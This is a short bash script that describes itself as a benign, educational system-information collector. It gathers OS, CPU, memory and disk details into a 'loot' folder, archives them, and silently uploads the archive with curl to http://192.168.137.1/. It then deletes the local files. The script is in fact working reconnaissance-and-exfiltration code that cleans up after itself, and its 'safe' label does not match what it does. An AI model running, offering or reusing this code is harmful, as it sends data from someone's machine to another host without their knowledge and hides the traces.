#!/bin/bash
# Benign system information collection script
# Collects basic system configuration (safe for educational/demo purposes)

OUTPUT_DIR="/tmp/loot_$$"
mkdir -p "$OUTPUT_DIR"

# System information
echo "=== System Information ===" > "$OUTPUT_DIR/system_info.txt"
uname -a >> "$OUTPUT_DIR/system_info.txt"
cat /etc/os-release >> "$OUTPUT_DIR/system_info.txt" 2>/dev/null
echo "" >> "$OUTPUT_DIR/system_info.txt"
echo "=== CPU Info ===" >> "$OUTPUT_DIR/system_info.txt"
lscpu >> "$OUTPUT_DIR/system_info.txt" 2>/dev/null

# Memory information
echo "=== Memory Info ===" > "$OUTPUT_DIR/memory_info.txt"
free -h >> "$OUTPUT_DIR/memory_info.txt"

# Disk information
echo "=== Disk Info ===" > "$OUTPUT_DIR/disk_info.txt"
df -h >> "$OUTPUT_DIR/disk_info.txt"

# Create archive and send
cd /tmp
tar czf loot.tar.gz "loot_$$"
curl -X POST -F "file=@loot.tar.gz" http://192.168.137.1/ 2>/dev/null
rm -rf "$OUTPUT_DIR" loot.tar.gz
